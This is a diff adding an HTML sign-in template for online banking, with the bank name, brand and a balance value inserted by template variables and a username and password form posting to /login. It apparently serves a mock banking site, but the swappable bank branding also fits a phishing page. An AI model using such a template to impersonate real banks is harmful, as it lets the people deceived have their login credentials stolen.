@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>{{ acct.bank }} — Sign In</title>
+  <style>
+    body { font-family: -apple-system, Segoe UI, Roboto, sans-serif; background: #eef2f7; }
+    .box { max-width: 360px; margin: 80px auto; background: #fff; padding: 28px;
+           border-radius: 10px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
+    h1 { color: #14532d; font-size: 20px; }
+    input { width: 100%; box-sizing: border-box; padding: 10px; margin: 8px 0;
+            border: 1px solid #ccc; border-radius: 6px; }
+    button { width: 100%; background: #14532d; color: #fff; border: 0; padding: 11px;
+             border-radius: 6px; font-size: 15px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h1>🏦 {{ acct.bank }}</h1>
+    <p>{{ notice if notice else "Sign in to online banking." }}</p>
+    <form method="post" action="/login">
+      <input type="hidden" name="brand" value="{{ brand }}" />
+      <input type="hidden" name="balance" value="{{ balance }}" />
+      <input name="username" id="username" placeholder="Username" autocomplete="username" />
+      <input name="password" id="password" type="password" placeholder="Password"
+             autocomplete="current-password" />
+      <button type="submit" id="signin">Sign In</button>
+    </form>
+  </div>
+</body>
+</html>
